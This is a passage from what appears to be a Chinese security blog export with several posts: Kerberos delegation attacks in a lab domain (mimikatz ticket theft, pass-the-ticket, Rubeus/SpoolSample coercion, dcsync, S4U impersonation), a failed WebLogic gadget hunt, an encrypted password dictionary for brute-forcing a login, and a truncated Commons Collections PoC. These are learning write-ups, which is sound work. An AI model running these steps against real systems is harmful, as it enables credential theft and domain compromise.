<p><img src="pic.png" alt="pic.png"></p>
<p><em>ps:有登陆的情况下构造过程中继承链的感觉更强烈，有兴趣的师傅可以试一下~</em></p>
<h2 id="参考">参考</h2>
<p><a href="http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p>
<p><a href="https://www.anquanke.com/post/id/85571">https://www.anquanke.com/post/id/85571</a></p>
<p><a href="http://www.cnblogs.com/iamstudy/articles/python_eval_and_bypass_sandbox_study.html">http://www.cnblogs.com/iamstudy/articles/python_eval_and_bypass_sandbox_study.html</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html">https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>用域委派打烂kerberos狗头</title>
    <url>/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/</url>
    <content><![CDATA[<!-- 如题 -->
<!-- more -->
<h2 id="简单回顾Kerberos认证过程">简单回顾Kerberos认证过程</h2>
<p>假设client想访问server</p>
<ol>
<li>client 向KDC-AS 发起预认证即NTLMhash加密的时间戳</li>
<li>KDC-AS 验证身份后，发送client NTLMhash加密的短会话密钥seesionkey-a和krbtgt账户密码加密的TGT(TGT中也包含了sessionkey-a)</li>
<li>client 用自己的NTLMhash解密拿到sessionkey-a，用sessionkey-a加密时间戳并发送加密的TGT给KDC-TGS</li>
<li>KDC-TGS用krbtgt账户密码解密获取到sessionkey-a，并解密client发送的时间戳以此验明client身份。之后返回sessionkey-a加密的sessionkey-b和server的密码加密TGS（有的文章也称ST）</li>
<li>client用sessionkey-a 解密拿到sessionkey-b，并用sessionkey-b加密时间戳一并和TGS发送给server</li>
<li>server用自己的密码解密TGS拿到sessionkey-b解密时间戳以此验明client身份。返回sessionkey-b加密的时间戳给client，以此向client表明自己的身份（这里体现出Kerberos的双向验证）。</li>
</ol>
<h2 id="委派的场景">委派的场景</h2>
<p>n1nty师傅的原话：用户 A 利用 Windows 身份验证访问了一个网站，请求网站内的一个文件，但是这个网站服务器本身并没有这个文件，它需要利用用户 A 的身份去访问另一台服务器，从另一台服务器上获取这个文件后再返回给用户。为什么网站会利用用户 A 的身份去获取文件，而不是直接利用网站自身的权限去获取呢？因为要充分利用 Windows 系统自身提供的权限控制啊，也许有的用户有权限访问那个文件而有的用户没有权限啊。</p>
<h2 id="kerberos委派分类">kerberos委派分类</h2>
<ul>
<li>Forwardable TGT：Unconstrained delegation</li>
<li>Proxy ticket：user 在访问 service1 的时候，提前把访问  service2 的票也申请好，并把这张票传递给 service1，然后  service1 就可以利用 user 的身份来访问  service2</li>
<li>Constrained delegation：传统的约束委派</li>
<li>Resource based delegation：基于资源的约束委派</li>
</ul>
<h2 id="非约束委派（Unconstrained-delegation）">非约束委派（Unconstrained delegation）</h2>
<p>假如server1主机账户配置了非约束委派，那么域账户A在对server1主机账户旗下服务service1（例如cifs服务）产生kerberos认证的时候（例如<code>dir \\server1\c$</code>）域账户会发送包含tgt的tgs给service1，然后service1就可以代表域账户A认证域内任何服务器。示意图如下<br>
<img src="./1569681143411.png" alt="Alt text"></p>
<p>其攻击面是如果黑客控制了server1并在上面抓取了tgt就可以借此横向移动。</p>
<h2 id="约束委派">约束委派</h2>
<p>约束委派里面有两种重要的协议一种叫S4U2Proxy，一种叫S4U2Self。假如在给server1主机账户配置了委派到的server2 service2服务。那么当域用户A与server1旗下的service1发生kerberos认证的时候，service1可以拿域用户A给的tgs1从域控换到可以访问server2 service2的tgs2。在用tgs1换tgs2的过程中使用的协议就是S4U2Proxy。可是有可能用户A以其他方式(如NTLM认证，基于表单的认证等方式)与server service1 认证后用户没法提供tgs，那么service1就先需要使用S4U2Self从域控那里先换到用户对自己服务的tgs1，再使用S4U2Proxy换可以访问server2 service2的tgs2。</p>
<p>S4U2Proxy的示意图如下<br>
<img src="./1570712520459.png" alt="Alt text"></p>
<p>S4U2Self的示意图如下<br>
<img src="./1570712530920.png" alt="Alt text"></p>
<p>其攻击面是如果黑客控制了server1那么他可以伪造域内任意用户访问server2的service2</p>
<h3 id="传统的约束委派">传统的约束委派</h3>
<p>传统的约束委派是“正向的”，通过修改服务A属性<code>msDS-AllowedToDelegateTo</code>，添加服务B的SPN（Service Principle Name），设置约束委派对象（服务B），服务A便可以模拟用户向域控制器请求访问服务B以获得服务票据（TGS）来使用服务B的资源。</p>
<h3 id="基于资源的约束委派">基于资源的约束委派</h3>
<p>2012 及以后的KDC，受限委派的机制变成了基于资源的约束委派。基于资源的约束委派则是相反的，通过修改服务B属性<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>，添加服务A的SPN，达到让服务A模拟用户访问B资源的目的。</p>
<p>两者联系与区别示意图如下<br>
<img src="./1569689280607.png" alt="Alt text"></p>
<h2 id="发现域内配置委派的账户">发现域内配置委派的账户</h2>
<p>在域内的可以委派的账户有两种一种是主机账户（NetComputer）另一种是用setspn手动添加的服务账户（NetUser），上文中不管是非约束还是约束的例子是以主机账户举例，因为用主机账户来委派的环境好搭并且便于理解，不过服务账户和主机账户从攻击委派这个视角来看是等价的。</p>
<p>检查非约束委派可以使用master版的PowerView<br>
<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-NetUser -Unconstrained -Domain beta.com</span><br><span class="line">Get-NetComputer -Unconstrained -Domain beta.com</span><br></pre></td></tr></table></figure>
<p>检查约束委派可以使用开发版的PowerView<br>
<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-DomainUser -TrustedToAuth -Domain beta.com</span><br><span class="line">Get-DomainComputer -TrustedToAuth -Domain beta.com</span><br></pre></td></tr></table></figure>
<h2 id="环境说明">环境说明</h2>
<p>WIN-PMID8H9A6H0 192.168.3.2（域控， server2012）<br>
exchange 192.168.3.3 (server2012)<br>
database 192.168.3.4 (win10)<br>
database2 192.168.3.5 (win7)</p>
<h2 id="攻击非约束委派">攻击非约束委派</h2>
<p>在WIN-PMID8H9A6H0上用域管登陆（这是一句废话，默认情况只有域管可以登陆域控），在Active Directory用户和计算机中，将computer组里面的database2选为<em>信任此计算机来委派任何服务</em>即非约束委派。然后在cmd中<code>dir \\database2\c$</code>。<br>
<img src="./1570709429377.png" alt="Alt text"></p>
<p>在database2上用本地管理员登陆并用mimikatz抓取tickets</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure>
<p>可以看到域管理员传来的tgt<br>
<img src="./1570709452890.png" alt="Alt text"></p>
<p>用mimikatz将域管理员的tgt导入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt [0;a4e7f]-2-0-60a10000-Administrator@krbtgt-BETA.COM.kirbi&quot; exit</span><br></pre></td></tr></table></figure>
<p><img src="./1570709549303.png" alt="Alt text"><br>
<img src="./1570709591012.png" alt="Alt text"></p>
<p>本地管理员成功访问域控<br>
<img src="./1570709682895.png" alt="Alt text"></p>
<h2 id="攻击非约束委派（进阶）">攻击非约束委派（进阶）</h2>
<p>上面利用非约束委派拿到域管账户TGT的前提是需要域管账户和委派主机有过交互才能获取到TGT。当域控机器开启Print Spooler服务时(默认开启且以System权限运行)，攻击者可以主动要求域控访问已被攻击者控制的非受限委派服务器，进而获取域控主机账户的TGT。当然这种攻击方式也适用于其他非域控机器。<strong>但是这种攻击有一个限制是需要找到一台开启非受限委派的主机账户，而非服务账户并且有一个域普通账户</strong></p>
<p><img src="./1570777540500.png" alt="Alt text"></p>
<p>完成这一套攻击需要两个<a href="https://github.com/GhostPack/Rubeus">Rubeus</a>和<a href="https://github.com/leechristensen/SpoolSample">SpoolSample</a>的工具，Rubeus可以看作对kekeo的弥补，SpoolSample用户向DC2 Print Spooler发起请求。SpoolSample貌似只能用.net4.0以上的版本编译，所以这次就在win10上用了。<br>
本地管理员运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:5 /filteruser:WIN-PMID8H9A6H0$</span><br></pre></td></tr></table></figure>
<p><img src="./1570850050489.png" alt="Alt text"></p>
<p>域普通账户运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SpoolSample.exe WIN-PMID8H9A6H0 database2</span><br></pre></td></tr></table></figure>
<p><img src="./1570850068279.png" alt="Alt text"><br>
困惑的是这里报错了，查了报错码说是Print Spooler没开，但是明明开了的。。。<br>
不过峰回路转的是database2 上可以抓到域控传来的tgt<br>
<img src="./1570868278901.png" alt="Alt text"><br>
<img src="./1570868800619.png" alt="Alt text"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt [0;a8543]-2-0-60a10000-WIN-PMID8H9A6H0$@krbtgt-BETA.COM.kirbi</span><br><span class="line">lsadump::dcsync /domain:beta.com /all /csv</span><br></pre></td></tr></table></figure>
<p><img src="./1570871508561.png" alt="Alt text"></p>
<h2 id="攻击约束委派">攻击约束委派</h2>
<p>域控上这么配置<br>
<img src="./1570713945685.png" alt="Alt text"></p>
<p>在database2上用mimikatz抓取主机账户htlm hash（主机账户即hostname$）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>
<p><img src="./1570701745743.png" alt="Alt text"></p>
<p>用拿到的ntlm hash申请tgt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgt::ask /user:database2$ /domain:beta.com /ntlm:65118c9246cada2aa3e1a366f3ed06cf</span><br></pre></td></tr></table></figure>
<p><img src="./1570702323339.png" alt="Alt text"></p>
<p><em>ps：其实抓hash和kekeo的操作在拥有database2主机权限下都是多余的操作。这里为了完整性写出来，其实际意义在于在实战中通过其他方式例如爆破获取了服务账号的密码（服务账号的密码是管理员自己设置所以可能是弱口令，至于主机账户的密码上上张图你也看到了长的过分）的情况下进行约束委派攻击。</em></p>
<p>获取访问exchange cifs服务的tgs（tgs是域管权限）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_database2$@BETA.COM_krbtgt~beta.com@BETA.COM.kirbi /user:Administrator@beta.com /service:cifs/exchange.beta.com</span><br></pre></td></tr></table></figure>
<p><img src="./1570702415606.png" alt="Alt text"></p>
<p>将tgs导入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@beta.com@BETA.COM_cifs~exchange.beta.com@BETA.COM.kirbi</span><br></pre></td></tr></table></figure>
<p><img src="./1570702431480.png" alt="Alt text"></p>
<p>以本地管理员身份假装域管访问exchange smb<br>
<img src="./1570702480513.png" alt="Alt text"></p>
<h2 id="杂">杂</h2>
<ul>
<li>默认情况下普通域用户只能登陆域中的PC不能登陆域中server</li>
<li>tgt使用与域账号无关，本地账户仍然可以使用tgt</li>
<li>tgt是从本质来说是krbtgt服务的tgs</li>
</ul>
<h2 id="参考">参考</h2>
<p><a href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Delegation.html">域渗透-Delegation</a><br>
<a href="http://blog.nsfocus.net/analysis-attacks-entitlement-resource-constrained-delegation/">利用资源约束委派进行的提权攻击分析</a><br>
<a href="https://paper.seebug.org/620/">利用 Kerberos delegation 打造变种黄金票据</a><br>
<a href="https://pathowe.co.uk/delegation-between-servers-windows-authenticated-sites/">Setting up delegation between servers for Windows authenticated sites</a><br>
<a href="https://xz.aliyun.com/t/2931">Attacking Kerberos Delegation</a><br>
<a href="https://github.com/Nu1LCTF/n1ctf-2019/blob/master/WEB/Pentest_N1CTF2019.lab/README.md">N1CTF 2019 Pentest N1ctf2019.lab WP</a><br>
<a href="https://blogs.msdn.microsoft.com/apgcdsd/2011/09/26/kerberosntlm-sql-server/">Kerberos和NTLM – SQL Server连接的那点事</a><br>
<a href="https://blog.csdn.net/yxwmzouzou/article/details/79002677">SQL Server 只安装客户端的方法</a></p>
]]></content>
      <categories>
        <category>ad security</category>
      </categories>
      <tags>
        <tag>kerberos</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次失败的Weblogic IIOP Gadget挖掘</title>
    <url>/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84Weblogic-IIOP-Gadget%E6%8C%96%E6%8E%98/</url>
    <content><![CDATA[<!-- more -->
<h2 id="前记">前记</h2>
<p>当时以为挖成功了，结果后来发现是少打了一个补丁，在朋友圈虚晃了一枪。不过整个利用思路还算有趣，这并不妨碍在这里分享一下。</p>
<h2 id="sink点可行性验证">sink点可行性验证</h2>
<p>开局风干师傅送了个sink点。</p>
<p><img src="image-20220304173625-rfymfzd.png" alt="image.png"></p>
<p>我们先来分析一下sink点com.tangosol.coherence.transaction.internal.storage.KeyBackingMap#put的可行性。</p>
<p><img src="image-20220304173841-084s55s.png" alt="image.png"></p>
<p>如果这里this.m_context是ReplicatedCache$BackingMapContext，反序列化的时候会进入BackingMapContext#getValueFromInternalConverter再进入getConverterFromInternal。</p>
<p><img src="image-20220304174359-croe38f.png" alt="image.png"></p>
<p>因为this.__m_ConverterFromInternal为transient在反序列的时候为空，根据代码逻辑反序列化的时候会创一个新的converter，并调用convert方法转换受控的oVal的对象。</p>
<p><img src="image-20220304174728-h7fb6qs.png" alt="image.png"></p>
<p>我们继续跟进，看一下converter是什么样子的, converter类型固定ReplicatedCache$ConverterFromInternal。</p>
<p><img src="image-20220304175214-4sf1oh8.png" alt="image.png"></p>
<p>ReplicatedCache$ConverterFromInternal的convert。</p>
<p><img src="image-20220304175319-iu49dix.png" alt="image.png"></p>
<p>是不是很眼熟？没错，<a href="https://xz.aliyun.com/t/9068">是我去年挖weblogic的时候找到的sink点</a>, 二阶反序列化类型。</p>
<h2 id="补全gadget">补全gadget</h2>
<p>那么现在需要从source点找一条通路，放入常见的source点自动化跑，无奈工具太菜，大海捞针。捞到一个，应该还有其他的，我没一个一个看了。</p>
<p><img src="image-20220304225954-l24t1tq.png" alt="image.png"></p>
<p>接下来再用BadAttributeValueExpException前半段就完全走通了。</p>
<h2 id="构造exp与javaassit的妙用">构造exp与javaassit的妙用</h2>
<p>路径找到了接着，就是填充一些必要的条件，构造payload了。</p>
<p>构造的时候会发现对com.tangosol.coherence.component.util.daemon.queueProcessor.Service有依赖。这个类是实现了Serializable接口的，但是官方的本意是不想让它被序列化的，</p>
<p><img src="image-20220304210431-375u930.png" alt="image.png"></p>
<p>不过在反序列化的时候，并没有做对应的检查。所以我们用javaassit强行把这个方法改成$1.defaultWriteObject();</p>
<p>类似的，javaassit的妙用还可以减轻构造payload时候的痛苦，我们可以审计一部分代码，用javaassit把没用的逻辑阉割掉。</p>
<p>例如KeyBackingMap构造方法中</p>
<p><img src="image-20220304211223-x6gne8z.png" alt="image.png"></p>
<p>context.getCacheService().getInfo().getServiceName(), 一波连环夺命call要正常运行需要各种补全条件，一波操作就为了拿一个没什么卵用的字符串。</p>
<h2 id="山穷水尽疑无路">山穷水尽疑无路</h2>
<p>至此一切都在向好的方向发展，首先我用没打补丁weblogic走了一波t3，一发入魂，稳稳的。打上最新补丁后走t3没成功，看报错想起了是去年oracle给t3加了一个ABBREV_CLASSES白名单。</p>
<p><img src="image-20220304213624-3kn8um9.png" alt="image.png"></p>
<p>但是没有关系，我们还可以用iiop重拳出击。长久以来我一直觉得t3和iiop是等价的东西，exp走t3成功，那走iiop也可成功，因此一直觉得官方单独给t3加白的操作不多余但没必要。</p>
<p>直到打完发现没成功，这下有点傻眼了。<br>
<img src="image-20220304213955-rx8vczj.png" alt="image.png"></p>
<p>看起来iiop和t3在反序列化的时候还是有不同。根据调用栈和调试可以定位到出错registerMessageType中的getMessageClassMap。</p>
<p><img src="image-20220304221011-g7od395.png" alt="image.png"></p>
<p><img src="image-20220304221737-pc9vl4s.png" alt="image.png"><img src="image-20220304221750-gjzcpbp.png" alt="image.png"></p>
<p>看到这里你可能充满疑惑</p>
<ul>
<li>反序列化不是可以控制任意成员变量（不严谨）吗？提前给__m_MessageClassMap设置好，不就可以规避空指针的问题？</li>
<li>为什么t3的时候没有遇到这个问题？</li>
</ul>
<p>这里限于篇幅，我就直接说我调试的结论了。</p>
<p>关于第一个问题，确实可以控制，但是这里涉及反序列化时序的问题，就算设置了__m_MessageClassMap，逻辑走到这一步的时候成员变量还没有被赋值。</p>
<p>关于第二个问题，是因为走iiop时，反序列化Component时registerVaildation调用抛出异常了，进入了t3情况下不会进入的validateObject。</p>
<p><img src="image-20220304222857-dwd6vqx.png" alt="image.png"></p>
<p>而出现异常的原因是也就是depth为0。</p>
<p><img src="image-20220304223120-g4g323u.png" alt="image.png"></p>
<p>通常情况下depth会随着反序列化时的深度动态变化，因此我猜开发的本意是禁止Component成为最外层的对象。</p>
<p><img src="image-20220304223702-prcmt93.png" alt="image.png"></p>
<p>但是IIOP因为自身实现的原因，进入了readObjectOverride，从始至终都没有进入readObject0。也就说整个过程depth一直为0。</p>
<p><img src="image-20220304224620-r2flbv8.png" alt="image.png"></p>
<p>至此情况变得很难受。t3白名单打不了，iiop因为这个gadget依赖了特殊的类也打不了。功败垂成，我当时觉得非常可惜。又折腾一会找不到替代类就放弃了。</p>
<h2 id="柳岸花明又一村">柳岸花明又一村</h2>
<p>大约过了三周之后，我又想起了这个洞，突然eureka。既然正常流能打iiop不能打，那能不能把iiop“转换”成正常流然后再打呢？</p>
<p>其实通过查看<a href="http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/">历史漏洞</a>可以知道CVE-2016-3510就可以做到这一点。</p>
<p><img src="image-20220306223053-llrmlnj.png" alt="image.png"></p>
<p>至此，全链路已经打通。</p>
<h2 id="为什么失败">为什么失败</h2>
<p>交给官方之后被驳回了，后来发现测试的时候少了一个补丁。</p>
<p>打补丁前：</p>
<p><img src="image-20220314134013-liz2r0c.png" alt="image.png"></p>
<p>打补丁后：</p>
<p>这里this.setFilter默认为true，也就说从2021的某一次补丁之后fromBinary这个点加了黑名单已经打不了。</p>
<p><img src="image-20220314135356-eyrxbug.png" alt="image.png"></p>
<h2 id="后记">后记</h2>
<p>虽然根据CVE-2016-3510，iiop和t3在漏洞利用上已经完全等价了。t3白不白已经不重要了，但t3白名单真的无法绕过吗？其实是可以的，但是这里空白太小写不下……</p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次简单的寻找前端加密爆破的逻辑过程</title>
    <url>/2019/11/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%AF%BB%E6%89%BE%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4%E7%9A%84%E9%80%BB%E8%BE%91%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<!-- 过程比较简单，属于一篇水文 -->
<!-- more -->
<p>过程比较简单，属于一篇水文。主要参考<a href="http://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/">这篇文章</a>中的第三种方法。</p>
<p>前端使用vue写的，把前端代码复制出来<br>
<img src="./1572845899524.png" alt="Alt text"></p>
<p>找到登陆那点的触发函数<br>
<img src="./1572845945947.png" alt="Alt text"></p>
<p>找到提交函数中密码变量<br>
<img src="./1572845965414.png" alt="Alt text"></p>
<p>全局搜索即可定位到加密逻辑，并且找到加密用的密钥<br>
<img src="./1572845913600.png" alt="Alt text"></p>
<p>通过注释可以发现是AES加密<br>
<img src="./1572846183710.png" alt="Alt text"></p>
<p>查看代码变量可以看出是AES-ECB</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">encrypt</span>=(<span class="params">word, keyStr</span>)=&gt;&#123;</span><br><span class="line">    keyStr = keyStr ? keyStr : <span class="string">&#x27;abcdefgabcdefg12&#x27;</span>;</span><br><span class="line">    <span class="keyword">let</span> key  = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(keyStr);<span class="comment">//Latin1 w8m31+Yy/Nw6thPsMpO5fg==</span></span><br><span class="line">    <span class="keyword">let</span> srcs = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(word);</span><br><span class="line">    <span class="keyword">let</span> encrypted = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(srcs, key, &#123;<span class="attr">mode</span>:<span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span>,<span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span>&#125;);</span><br><span class="line">    <span class="keyword">return</span> encrypted.<span class="title function_">toString</span>();</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>
<p>从网上找个python版的AES-ECB脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AESUtil</span>:</span><br><span class="line"></span><br><span class="line">    __BLOCK_SIZE_16 = BLOCK_SIZE_16 = AES.block_size</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encryt</span>(<span class="params"><span class="built_in">str</span>, key</span>):</span><br><span class="line">        cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        x = AESUtil.__BLOCK_SIZE_16 - (<span class="built_in">len</span>(<span class="built_in">str</span>) % AESUtil.__BLOCK_SIZE_16)</span><br><span class="line">        <span class="keyword">if</span> x != <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">str</span> = <span class="built_in">str</span> + <span class="built_in">chr</span>(x)*x</span><br><span class="line">        msg = cipher.encrypt(<span class="built_in">str</span>)</span><br><span class="line">        msg = base64.urlsafe_b64encode(msg).replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">enStr, key</span>):</span><br><span class="line">        cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        enStr += (<span class="built_in">len</span>(enStr) % <span class="number">4</span>)*<span class="string">&quot;=&quot;</span></span><br><span class="line">        decryptByts = base64.urlsafe_b64decode(enStr)</span><br><span class="line">        msg = cipher.decrypt(decryptByts)</span><br><span class="line">        paddingLen = <span class="built_in">ord</span>(msg[<span class="built_in">len</span>(msg)-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> msg[<span class="number">0</span>:-paddingLen]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key = <span class="string">&quot;G20PAA&amp;9-EEFPQ5T&quot;</span></span><br><span class="line">    <span class="built_in">print</span> AESUtil.encryt(<span class="string">&quot;123456&quot;</span>, key)</span><br></pre></td></tr></table></figure>
<p>将跑出来的脚本和提交的对比，发现提交的有padding。<br>
<img src="./1572846839888.png" alt="Alt text"><br>
<img src="./1572846861106.png" alt="Alt text"></p>
<p>稍微修改一下代码逻辑，从github上下弱口令字典生成加密字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AESUtil</span>:</span><br><span class="line"></span><br><span class="line">    __BLOCK_SIZE_16 = BLOCK_SIZE_16 = AES.block_size</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encryt</span>(<span class="params"><span class="built_in">str</span>, key</span>):</span><br><span class="line">        cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        x = AESUtil.__BLOCK_SIZE_16 - (<span class="built_in">len</span>(<span class="built_in">str</span>) % AESUtil.__BLOCK_SIZE_16)</span><br><span class="line">        <span class="keyword">if</span> x != <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">str</span> = <span class="built_in">str</span> + <span class="built_in">chr</span>(x)*x</span><br><span class="line">        msg = cipher.encrypt(<span class="built_in">str</span>)</span><br><span class="line">        msg = base64.urlsafe_b64encode(msg)</span><br><span class="line">        <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">enStr, key</span>):</span><br><span class="line">        cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        enStr += (<span class="built_in">len</span>(enStr) % <span class="number">4</span>)*<span class="string">&quot;=&quot;</span></span><br><span class="line">        decryptByts = base64.urlsafe_b64decode(enStr)</span><br><span class="line">        msg = cipher.decrypt(decryptByts)</span><br><span class="line">        paddingLen = <span class="built_in">ord</span>(msg[<span class="built_in">len</span>(msg)-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> msg[<span class="number">0</span>:-paddingLen]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    resp = requests.get(url=<span class="string">&quot;https://raw.githubusercontent.com/TheKingOfDuck/fuzzDicts/master/passwordDict/top1000.txt&quot;</span>)</span><br><span class="line">    passwd_list = resp.content.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    key = <span class="string">&quot;G20PAA&amp;9-EEFPQ5T&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./top1000en.txt&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> passwd_list:</span><br><span class="line">            f.write(AESUtil.encryt(i, key) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> AESUtil.encryt(<span class="string">&quot;123456&quot;</span>, key)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次调试Commons Collections5遇到的小坑</title>
    <url>/2019/11/29/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B0%83%E8%AF%95Commons%20Collections5%E9%81%87%E5%88%B0%E7%9A%84%E5%B0%8F%E5%9D%91/</url>
    <content><![CDATA[<!-- 故事的起因是学弟来问我为什么在调Commons Collections5的时候，还没有走到触发点就触发了RCE。 -->
<!-- more -->
<p>故事的起因是学弟来问我为什么在调Commons Collections5的时候，还没有走到触发点就触发了RCE。并发来了<a href="https://www.jianshu.com/p/d4954c691d09">这篇文章</a>。<br>
我当时以commons collections5为例，调试了一下代码发现确实有这种情况。以下是调试用的demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span 